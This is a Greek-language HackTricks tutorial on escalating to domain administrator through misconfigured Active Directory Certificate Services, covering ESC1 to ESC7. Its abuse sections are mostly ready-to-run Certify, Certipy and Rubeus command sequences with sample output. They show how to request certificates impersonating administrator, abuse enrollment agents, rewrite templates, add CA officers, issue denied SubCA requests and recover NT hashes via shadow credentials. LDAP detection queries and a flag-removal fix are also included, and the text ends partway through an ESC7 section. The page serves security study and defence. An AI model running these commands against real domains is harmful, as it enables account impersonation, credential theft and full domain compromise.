# AD CS Ανάβαθμιση στο Domain

{{#include ../../../banners/hacktricks-training.md}}


**Αυτή είναι μια περίληψη των τμημάτων τεχνικών ανάβαθμισης των δημοσιεύσεων:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Μη σωστά ρυθμισμένα πρότυπα πιστοποιητικών - ESC1

### Επεξήγηση

### Μη σωστά ρυθμισμένα πρότυπα πιστοποιητικών - ESC1 Επεξηγημένα

- **Δικαιώματα εγγραφής χορηγούνται σε χρήστες με χαμηλά προνόμια από την Enterprise CA.**
- **Δεν απαιτείται έγκριση από manager.**
- **Δεν χρειάζονται υπογραφές από εξουσιοδοτημένο προσωπικό.**
- **Οι security descriptors στα πρότυπα πιστοποιητικών είναι υπερβολικά επιεικείς, επιτρέποντας σε χρήστες με χαμηλά προνόμια να αποκτήσουν δικαιώματα εγγραφής.**
- **Τα πρότυπα πιστοποιητικών είναι ρυθμισμένα ώστε να ορίζουν EKUs που διευκολύνουν την αυθεντικοποίηση:**
- Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
- **Το πρότυπο επιτρέπει στους αιτούντες να περιλαμβάνουν subjectAltName στο Certificate Signing Request (CSR):**
- Το Active Directory (AD) δίνει προτεραιότητα στο subjectAltName (SAN) ενός πιστοποιητικού για την επαλήθευση ταυτότητας εάν είναι παρόν. Αυτό σημαίνει ότι με την καθορισμένη SAN σε ένα CSR, μπορεί να ζητηθεί πιστοποιητικό για να μιμηθεί οποιονδήποτε χρήστη (π.χ. έναν domain administrator). Το αν μπορεί να οριστεί SAN από τον αιτούντα υποδεικνύεται στο αντικείμενο του προτύπου πιστοποιητικού στο AD μέσω της ιδιότητας `mspki-certificate-name-flag`. Αυτή η ιδιότητα είναι bitmask, και η παρουσία της σημαίας `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` επιτρέπει τον καθορισμό της SAN από τον αιτούντα.

> [!CAUTION]
> Η περιγραφόμενη διαμόρφωση επιτρέπει σε χρήστες με χαμηλά προνόμια να ζητήσουν πιστοποιητικά με οποιαδήποτε SAN επιθυμούν, επιτρέποντας την αυθεντικοποίηση ως οποιοσδήποτε domain principal μέσω Kerberos ή SChannel.

Αυτή η δυνατότητα μερικές φορές ενεργοποιείται για να υποστηρίξει τη δυναμική δημιουργία HTTPS ή host πιστοποιητικών από προϊόντα ή υπηρεσίες ανάπτυξης, ή λόγω έλλειψης κατανόησης.

Σημειώνεται ότι η δημιουργία ενός πιστοποιητικού με αυτήν την επιλογή προκαλεί προειδοποίηση, κάτι που δεν ισχύει όταν ένα υπάρχον πρότυπο πιστοποιητικού (όπως το πρότυπο `WebServer`, το οποίο έχει ενεργοποιημένο το `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) αντιγράφεται και στη συνέχεια τροποποιείται για να συμπεριλάβει ένα authentication OID.

### Κατάχρηση

Για να **βρείτε ευάλωτα πρότυπα πιστοποιητικών** μπορείτε να τρέξετε:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Για να **εκμεταλλευτεί αυτή την ευπάθεια για να προσποιηθεί έναν διαχειριστή** κάποιος θα μπορούσε να εκτελέσει:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Στη συνέχεια μπορείτε να μετατρέψετε το παραγόμενο **πιστοποιητικό σε μορφή `.pfx`** και να το χρησιμοποιήσετε για **αυθεντικοποίηση με Rubeus ή certipy** ξανά:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Τα Windows binaries "Certreq.exe" & "Certutil.exe" μπορούν να χρησιμοποιηθούν για να δημιουργήσουν το PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Η απαρίθμηση των προτύπων πιστοποιητικών στο σχήμα διαμόρφωσης του AD Forest, συγκεκριμένα αυτών που δεν απαιτούν έγκριση ή υπογραφές, που έχουν Client Authentication ή Smart Card Logon EKU, και με το flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ενεργοποιημένο, μπορεί να γίνει εκτελώντας το ακόλουθο LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Εσφαλμένα διαμορφωμένα πρότυπα πιστοποιητικών - ESC2

### Εξήγηση

Το δεύτερο σενάριο κατάχρησης είναι μια παραλλαγή του πρώτου:

1. Δικαιώματα εγγραφής χορηγούνται σε χρήστες με χαμηλά προνόμια από το Enterprise CA.
2. Η απαίτηση για έγκριση από manager είναι απενεργοποιημένη.
3. Η ανάγκη για εξουσιοδοτημένες υπογραφές παραλείπεται.
4. Ένας υπερβολικά επιεικής security descriptor στο πρότυπο πιστοποιητικού χορηγεί δικαιώματα εγγραφής πιστοποιητικών σε χρήστες με χαμηλά προνόμια.
5. **Το πρότυπο πιστοποιητικού ορίζεται ώστε να περιλαμβάνει το Any Purpose EKU ή να μην έχει EKU.**

Το **Any Purpose EKU** επιτρέπει σε έναν attacker να αποκτήσει ένα πιστοποιητικό για **οποιονδήποτε σκοπό**, συμπεριλαμβανομένης της client authentication, server authentication, code signing, κ.λπ. Η ίδια **τεχνική που χρησιμοποιείται για το ESC3** μπορεί να χρησιμοποιηθεί για την εκμετάλλευση αυτού του σεναρίου.

Πιστοποιητικά χωρίς **EKUs**, που λειτουργούν ως subordinate CA certificates, μπορούν να εκμεταλλευτούν για **οποιονδήποτε σκοπό** και μπορούν **επίσης να χρησιμοποιηθούν για την υπογραφή νέων πιστοποιητικών**. Συνεπώς, ένας attacker θα μπορούσε να καθορίσει αυθαίρετα EKUs ή πεδία στα νέα πιστοποιητικά αξιοποιώντας ένα subordinate CA certificate.

Ωστόσο, νέα πιστοποιητικά που δημιουργούνται για **domain authentication** δεν θα λειτουργήσουν αν το subordinate CA δεν εμπιστεύεται από το αντικείμενο **`NTAuthCertificates`**, που είναι η προεπιλεγμένη ρύθμιση. Παρ' όλα αυτά, ένας attacker μπορεί ακόμη να δημιουργήσει **νέα πιστοποιητικά με οποιοδήποτε EKU** και αυθαίρετες τιμές πιστοποιητικών. Αυτά θα μπορούσαν δυνητικά να **κακοποιηθούν** για ένα ευρύ φάσμα σκοπών (π.χ., code signing, server authentication, κ.λπ.) και θα μπορούσαν να έχουν σημαντικές επιπτώσεις για άλλες εφαρμογές στο δίκτυο όπως SAML, AD FS, ή IPSec.

Για να απαριθμήσετε πρότυπα που ταιριάζουν με αυτό το σενάριο εντός του configuration schema του AD Forest, μπορεί να εκτελεστεί το παρακάτω LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Λανθασμένα διαμορφωμένα πρότυπα Enrollment Agent - ESC3

### Εξήγηση

Αυτό το σενάριο είναι όπως το πρώτο και το δεύτερο αλλά **καταχράται** ένα **διαφορετικό EKU** (Certificate Request Agent) και **2 διαφορετικά templates** (άρα έχει 2 σετ προαπαιτήσεων),

Το **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), γνωστό ως **Enrollment Agent** στη τεκμηρίωση της Microsoft, επιτρέπει σε ένα principal να **enroll** για ένα **certificate** **εκ μέρους άλλου χρήστη**.

Ο **“enrollment agent”** πραγματοποιεί enroll σε τέτοιο **template** και χρησιμοποιεί το προκύπτον **certificate για να co-sign ένα CSR εκ μέρους του άλλου χρήστη**. Έπειτα **στέλνει** το **co-signed CSR** στην CA, κάνοντας enroll σε ένα **template** που **επιτρέπει “enroll on behalf of”**, και η CA απαντά με ένα **certificate που ανήκει στον “άλλο” χρήστη**.

**Απαιτήσεις 1:**

- Enrollment rights χορηγούνται σε χρήστες με χαμηλά προνόμια από την Enterprise CA.
- Η απαίτηση για έγκριση από manager έχει παραληφθεί.
- Καμία απαίτηση για εξουσιοδοτημένες υπογραφές.
- Ο security descriptor του certificate template είναι υπερβολικά επιεικής, χορηγώντας enrollment rights σε χρήστες με χαμηλά προνόμια.
- Το certificate template περιλαμβάνει το Certificate Request Agent EKU, επιτρέποντας το αίτημα άλλων certificate templates εκ μέρους άλλων principals.

**Απαιτήσεις 2:**

- Η Enterprise CA χορηγεί enrollment rights σε χρήστες με χαμηλά προνόμια.
- Η έγκριση από manager παρακάμπτεται.
- Η έκδοση σχήματος (schema version) του template είναι είτε 1 είτε μεγαλύτερη του 2, και καθορίζει ένα Application Policy Issuance Requirement που απαιτεί το Certificate Request Agent EKU.
- Ένα EKU που ορίζεται στο certificate template επιτρέπει domain authentication.
- Δεν εφαρμόζονται περιορισμοί για enrollment agents στην CA.

### Κατάχρηση

Μπορείτε να χρησιμοποιήσετε [**Certify**](https://github.com/GhostPack/Certify) ή [**Certipy**](https://github.com/ly4k/Certipy) για να εκμεταλλευτείτε αυτό το σενάριο:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Οι **χρήστες** που επιτρέπεται να **αποκτήσουν** ένα **πιστοποιητικό πράκτορα εγγραφής**, τα πρότυπα στα οποία οι πράκτορες **έχουν δικαίωμα εγγραφής**, και οι **λογαριασμοί** εκ μέρους των οποίων ο πράκτορας εγγραφής μπορεί να ενεργεί μπορούν να περιοριστούν από τις enterprise CAs. Αυτό επιτυγχάνεται ανοίγοντας το `certsrc.msc` snap-in, κάνοντας **δεξί κλικ στην CA**, **κλικάροντας Properties**, και στη συνέχεια **πλοηγούμενοι** στην καρτέλα “Enrollment Agents”.

Ωστόσο, σημειώνεται ότι η **προεπιλεγμένη** ρύθμιση για τις CAs είναι “**Do not restrict enrollment agents**.” Όταν ο περιορισμός στους πράκτορες εγγραφής ενεργοποιηθεί από τους διαχειριστές, ορίζοντάς τον σε “Restrict enrollment agents,” η προεπιλεγμένη διαμόρφωση παραμένει εξαιρετικά επιεικής. Επιτρέπει στο **Everyone** πρόσβαση για εγγραφή σε όλα τα πρότυπα ως οποιοσδήποτε.

## Επιρρεπής Έλεγχος Πρόσβασης Προτύπου Πιστοποιητικού - ESC4

### **Επεξήγηση**

Ο **security descriptor** σε **certificate templates** καθορίζει τα **permissions** που έχουν συγκεκριμένοι **AD principals** σχετικά με το πρότυπο.

Εάν ένας **επιτιθέμενος** διαθέτει τα απαιτούμενα **permissions** για να **τροποποιήσει** ένα **template** και να **εγκαταστήσει** οποιεσδήποτε **εκμεταλλεύσιμες κακόδιαμορφώσεις** που περιγράφονται σε **προηγούμενες ενότητες**, μπορεί να διευκολυνθεί η αύξηση προνομίων.

Σημαντικά permissions που ισχύουν για certificate templates περιλαμβάνουν:

- **Owner:** Παρέχει έμμεσο έλεγχο του αντικειμένου, επιτρέποντας την τροποποίηση οποιωνδήποτε χαρακτηριστικών.
- **FullControl:** Επιτρέπει πλήρη εξουσία επί του αντικειμένου, συμπεριλαμβανομένης της δυνατότητας να αλλάξει οποιαδήποτε χαρακτηριστικά.
- **WriteOwner:** Επιτρέπει την αλλαγή του ιδιοκτήτη (owner) του αντικειμένου σε έναν principal υπό τον έλεγχο του επιτιθέμενου.
- **WriteDacl:** Επιτρέπει την προσαρμογή των access controls, ενδεχομένως χορηγώντας στον επιτιθέμενο FullControl.
- **WriteProperty:** Εξουσιοδοτεί την επεξεργασία οποιωνδήποτε ιδιοτήτων του αντικειμένου.

### Κατάχρηση

Για να εντοπίσετε τους principals με δικαιώματα επεξεργασίας σε πρότυπα και άλλα PKI αντικείμενα, απαριθμήστε με Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

Ένα παράδειγμα privesc όπως το προηγούμενο:

ESC4 είναι όταν ένας χρήστης έχει δικαιώματα εγγραφής πάνω σε ένα πρότυπο πιστοποιητικού. Αυτό, για παράδειγμα, μπορεί να καταχραστεί για να αντικαταστήσει τη διαμόρφωση του πρότυπου πιστοποιητικού και να καταστήσει το πρότυπο ευάλωτο σε ESC1.

Όπως βλέπουμε στη διαδρομή παραπάνω, μόνο ο `JOHNPC` έχει αυτά τα προνόμια, αλλά ο χρήστης μας `JOHN` έχει το νέο `AddKeyCredentialLink` edge προς τον `JOHNPC`.

Δεδομένου ότι αυτή η τεχνική σχετίζεται με πιστοποιητικά, έχω υλοποιήσει και αυτή την επίθεση, η οποία είναι γνωστή ως [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Εδώ μια μικρή προεπισκόπηση της εντολής `shadow auto` του Certipy για την ανάκτηση του NT hash του θύματος.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** μπορεί να overwrite τη διαμόρφωση ενός προτύπου πιστοποιητικού με μία εντολή. Από **default**, το Certipy θα **overwrite** τη διαμόρφωση ώστε να γίνει **vulnerable to ESC1**. Μπορούμε επίσης να ορίσουμε την παράμετρο **`-save-old` για να αποθηκεύσουμε την παλιά διαμόρφωση**, κάτι που θα είναι χρήσιμο για την επαναφορά της διαμόρφωσης μετά την επίθεσή μας.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Εύθραυστη πρόσβαση αντικειμένων PKI - ESC5

### Επεξήγηση

Ο εκτεταμένος ιστός αλληλοσυνδεόμενων σχέσεων βασισμένων σε ACL, που περιλαμβάνει αρκετά αντικείμενα πέρα από τα certificate templates και την certificate authority, μπορεί να επηρεάσει την ασφάλεια ολόκληρου του συστήματος AD CS. Αυτά τα αντικείμενα, τα οποία μπορούν να επηρεάσουν σημαντικά την ασφάλεια, περιλαμβάνουν:

- Το AD computer object του CA server, το οποίο μπορεί να συμβιβαστεί μέσω μηχανισμών όπως S4U2Self ή S4U2Proxy.
- Ο RPC/DCOM server του CA server.
- Οποιοδήποτε κατώτερο AD object ή container μέσα στη συγκεκριμένη διαδρομή container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Αυτή η διαδρομή περιλαμβάνει, αλλά δεν περιορίζεται σε, containers και αντικείμενα όπως το Certificate Templates container, το Certification Authorities container, το NTAuthCertificates object και το Enrollment Services Container.

Η ασφάλεια του PKI συστήματος μπορεί να τεθεί σε κίνδυνο αν ένας επιτιθέμενος με χαμηλά προνόμια καταφέρει να αποκτήσει έλεγχο σε οποιοδήποτε από αυτά τα κρίσιμα στοιχεία.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Επεξήγηση

Το θέμα που συζητείται στο [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) αγγίζει επίσης τις επιπτώσεις του flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, όπως περιγράφει η Microsoft. Αυτή η ρύθμιση, όταν ενεργοποιείται σε μια Certification Authority (CA), επιτρέπει την εισαγωγή **user-defined values** στο **subject alternative name** για **οποιοδήποτε request**, συμπεριλαμβανομένων αυτών που δημιουργούνται από Active Directory®. Επομένως, αυτή η δυνατότητα επιτρέπει σε έναν **εισβολέα** να εγγραφεί μέσω **οποιουδήποτε template** που έχει ρυθμιστεί για domain **authentication** — συγκεκριμένα αυτών που είναι ανοιχτά για εγγραφή από **μη προνομιούχους** χρήστες, όπως το standard User template. Ως αποτέλεσμα, μπορεί να αποκτηθεί ένα certificate, επιτρέποντας στον εισβολέα να αυθεντικοποιηθεί ως domain administrator ή **οποιαδήποτε άλλη ενεργή οντότητα** στο domain.

**Σημείωση**: Η μέθοδος για την προσθήκη **alternative names** σε ένα Certificate Signing Request (CSR), μέσω του argument `-attrib "SAN:"` στο `certreq.exe` (αναφερόμενη ως “Name Value Pairs”), παρουσιάζει μια **αντίθεση** με τη στρατηγική εκμετάλλευσης των SANs στο ESC1. Εδώ, η διαφορά έγκειται στον τρόπο που **οι πληροφορίες του λογαριασμού ενσωματώνονται** — μέσα σε ένα certificate attribute, αντί για ένα extension.

### Κατάχρηση

Για να επαληθεύσουν εάν η ρύθμιση είναι ενεργοποιημένη, οι οργανισμοί μπορούν να χρησιμοποιήσουν την παρακάτω εντολή με `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Αυτή η ενέργεια χρησιμοποιεί ουσιαστικά **remote registry access**, επομένως μια εναλλακτική προσέγγιση θα μπορούσε να είναι:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Εργαλεία όπως [**Certify**](https://github.com/GhostPack/Certify) και [**Certipy**](https://github.com/ly4k/Certipy) μπορούν να εντοπίσουν αυτή τη λανθασμένη διαμόρφωση και να την εκμεταλλευτούν:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Για να τροποποιηθούν αυτές οι ρυθμίσεις, εφόσον κάποιος διαθέτει **δικαιώματα διαχειριστή domain** ή ισοδύναμα, η ακόλουθη εντολή μπορεί να εκτελεστεί από οποιονδήποτε σταθμό εργασίας:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Για να απενεργοποιήσετε αυτήν τη ρύθμιση στο περιβάλλον σας, το flag μπορεί να αφαιρεθεί με:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Μετά τις ενημερώσεις ασφαλείας του Μαΐου 2022, τα **certificates** που εκδίδονται πρόσφατα θα περιέχουν ένα **security extension** που ενσωματώνει το **requester's `objectSid` property**. Για το ESC1, αυτό το SID προέρχεται από το καθορισμένο SAN. Ωστόσο, για το **ESC6**, το SID αντικατοπτρίζει το **requester's `objectSid`**, όχι το SAN.\
> Για να εκμεταλλευτεί κανείς το ESC6, είναι απαραίτητο το σύστημα να είναι ευάλωτο στο ESC10 (Weak Certificate Mappings), το οποίο προτιμά το **SAN over the new security extension**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Ο έλεγχος πρόσβασης για μια certificate authority διατηρείται μέσω ενός συνόλου permissions που ρυθμίζουν τις ενέργειες του CA. Αυτά τα permissions μπορούν να προβληθούν ανοίγοντας το `certsrv.msc`, κάνοντας δεξί κλικ σε μια CA, επιλέγοντας properties, και στη συνέχεια πηγαίνοντας στην Security tab. Επιπλέον, τα permissions μπορούν να απαριθμηθούν χρησιμοποιώντας το PSPKI module με εντολές όπως:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Αυτό παρέχει πληροφορίες σχετικά με τα κύρια δικαιώματα, δηλαδή **`ManageCA`** και **`ManageCertificates`**, τα οποία αντιστοιχούν στους ρόλους «Διαχειριστής CA» και «Διαχειριστής Πιστοποιητικών» αντίστοιχα.

#### Κατάχρηση

Η κατοχή των δικαιωμάτων **`ManageCA`** σε μια certificate authority επιτρέπει στην οντότητα να χειρίζεται ρυθμίσεις απομακρυσμένα με χρήση του PSPKI. Αυτό περιλαμβάνει την εναλλαγή του flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** για να επιτραπεί ο καθορισμός SAN σε οποιοδήποτε πρότυπο, ένα κρίσιμο στοιχείο για την ανύψωση προνομίων στο domain.

Η απλοποίηση αυτής της διαδικασίας είναι εφικτή μέσω του cmdlet **Enable-PolicyModuleFlag** του PSPKI, επιτρέποντας τροποποιήσεις χωρίς άμεση αλληλεπίδραση με το GUI.

Η κατοχή των δικαιωμάτων **`ManageCertificates`** διευκολύνει την έγκριση εκκρεμών αιτήσεων, παρακάμπτοντας στην ουσία την προφύλαξη «έγκριση διαχειριστή πιστοποιητικού CA».

Μια συνδυασμένη χρήση των modules **Certify** και **PSPKI** μπορεί να χρησιμοποιηθεί για να ζητηθεί, να εγκριθεί και να ληφθεί ένα πιστοποιητικό:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Επίθεση 2

#### Εξήγηση

> [!WARNING]
> Στην **προηγούμενη επίθεση** οι άδειες **`Manage CA`** χρησιμοποιήθηκαν για να **ενεργοποιήσουν** τη σημαία **EDITF_ATTRIBUTESUBJECTALTNAME2** για να εκτελέσουν την **ESC6 attack**, αλλά αυτό δεν θα έχει κανένα αποτέλεσμα μέχρι η υπηρεσία CA (`CertSvc`) να επανεκκινηθεί. Όταν ένας χρήστης έχει το δικαίωμα πρόσβασης `Manage CA`, του επιτρέπεται επίσης να **επανεκκινήσει την υπηρεσία**. Ωστόσο, αυτό **δεν σημαίνει ότι ο χρήστης μπορεί να επανεκκινήσει την υπηρεσία απομακρυσμένα**. Επιπλέον, E**SC6 might not work out of the box** στα περισσότερα ενημερωμένα περιβάλλοντα λόγω των ενημερώσεων ασφάλειας του Μαΐου 2022.

Συνεπώς, παρουσιάζεται εδώ μια άλλη επίθεση.

Προαπαιτούμενα:

- Μόνο **`ManageCA` permission**
- **`Manage Certificates`** permission (μπορεί να παραχωρηθεί από **`ManageCA`**)
- Το πρότυπο πιστοποιητικού **`SubCA`** πρέπει να είναι **enabled** (μπορεί να ενεργοποιηθεί από **`ManageCA`**)

Η τεχνική βασίζεται στο γεγονός ότι οι χρήστες με τα δικαιώματα `Manage CA` _και_ `Manage Certificates` μπορούν να **εκδίδουν αποτυχημένα αιτήματα πιστοποιητικών**. Το πρότυπο πιστοποιητικού **`SubCA`** είναι **vulnerable to ESC1**, αλλά **μόνο οι διαχειριστές** μπορούν να εγγραφούν στο πρότυπο. Έτσι, ένας **χρήστης** μπορεί να **αιτηθεί** εγγραφή στο **`SubCA`** — η οποία θα **απορριφθεί** — αλλά στη συνέχεια να **εκδοθεί από τον διαχειριστή**.

#### Κατάχρηση

Μπορείς να **παραχωρήσεις στον εαυτό σου το δικαίωμα `Manage Certificates`** προσθέτοντας τον χρήστη σου ως νέο officer.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Το **`SubCA`** πρότυπο μπορεί να **ενεργοποιηθεί στον CA** με την παράμετρο `-enable-template`. Από προεπιλογή, το πρότυπο `SubCA` είναι ενεργοποιημένο.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Αν έχουμε εκπληρώσει τις προαπαιτήσεις για αυτή την επίθεση, μπορούμε να ξεκινήσουμε ζητώντας ένα πιστοποιητικό βάσει του προτύπου `SubCA`.

**Αυτό το αίτημα θα απορριφθεί**, αλλά θα αποθηκεύσουμε το ιδιωτικό κλειδί και θα σημειώσουμε το ID του αιτήματος.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Με τα δικαιώματά μας **`Manage CA` και `Manage Certificates`**, μπορούμε στη συνέχεια να **εκδώσουμε το αποτυχημένο αίτημα πιστοποιητικού** με την εντολή `ca` και την παράμετρο `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Και τέλος, μπορούμε να **ανακτήσουμε το εκδοθέν πιστοποιητικό** με την εντολή `req` και την παράμετρο `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Επίθεση 3 – Κατάχρηση Manage Certificates Extension (SetExtension)

#### Επεξήγηση

Επιπλέον των κλασικών καταχρήσεων ESC7 (ενεργοποίηση EDITF attributes ή έγκριση εκκρεμών αιτήσεων), **Certify 2.0** αποκάλυψε ένα καινούριο primitive που απαιτεί μόνο το ρόλο *Manage Certificates* (γνωστό και ως **Certificate Manager / Officer**) στον Enterprise CA.

Η μέθοδος RPC `ICertAdmin::SetExtension` μπορεί να εκτελεστεί από οποιονδήποτε principal έχει το *Manage Certificates*. Ενώ η μέθοδος χρησιμοποιείτο παραδοσιακά από νόμιμους CAs για να ενημερώνει extensions σε **pending** requests, ένας επιτιθέμενος μπορεί να την καταχραστεί για να **προσθέσει μια *μη-προεπιλεγμένη* certificate extension** (π.χ. ένα custom *Certificate Issuance Policy* OID όπως `1.1.1.1`) σε ένα request που περιμένει έγκριση.

Επειδή το στοχευόμενο template **δεν ορίζει προεπιλεγμένη τιμή για αυτή την επέκταση**, ο CA δεν θα αντικαταστήσει την τιμή που ελέγχεται από τον επιτιθέμενο όταν η αίτηση τελικά εκδοθεί. Το προκύπτον πιστοποιητικό επομένως περιέχει μια επέκταση επιλεγμένη από τον επιτιθέμενο που μπορεί να:

* Ικανοποιήσει απαιτήσεις Application / Issuance Policy άλλων ευάλωτων templates (οδηγώντας σε ανύψωση προνομίων).
* Εισαγάγει επιπλέον EKUs ή πολιτικές που χορηγούν στο πιστοποιητικό απροσδόκητη εμπιστοσύνη σε τρίτα συστήματα.

